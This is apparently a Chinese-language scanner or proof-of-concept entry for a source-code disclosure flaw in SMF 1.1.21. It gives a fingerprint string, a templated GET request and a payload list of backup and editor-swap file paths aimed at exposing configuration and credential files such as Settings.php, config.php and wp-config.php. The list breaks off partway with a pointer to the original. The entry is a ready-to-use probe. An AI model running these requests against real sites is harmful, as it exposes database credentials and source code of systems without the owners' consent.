# SMF系统存在源码泄露漏洞

- **系统**：SMF　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`body="Powered by SMF 1.1.21"`
- **请求**：`GET /index.php~ HTTP/1.1`

**请求体 / payload**
```
批量 HTTP 请求模板，直接替换路径即可
GET {{PATH}} HTTP/1.1
Host: {{target}}
文件泄露的 Payload 路径
/index.php~
/index.php.bak
/index.php.old
/index.php.orig
/index.php.save
/index.php.swp
/index.php.swo
/index.php.tmp
/Settings.php~
/Settings.php.bak
/Settings.php.old
/Settings.php.swp
/config.php~
/config.php.bak
/config.php.old
/config.php.swp
/configuration.php~
/configuration.php.bak
/wp-config.php~
/wp-config.php.bak
/database.php~
/database.php.bak
/conn.php~
/conn.php.bak
/admin.php~
/admin.php.bak
/login.php~
/login.php.bak
/api.php~
/api.php.bak
/Subs.php~
/Subs.php.bak
/QueryString.php~
/QueryString.php.…（脚本共 690 字，完整版见原文）
```
- **预期**：200　|　—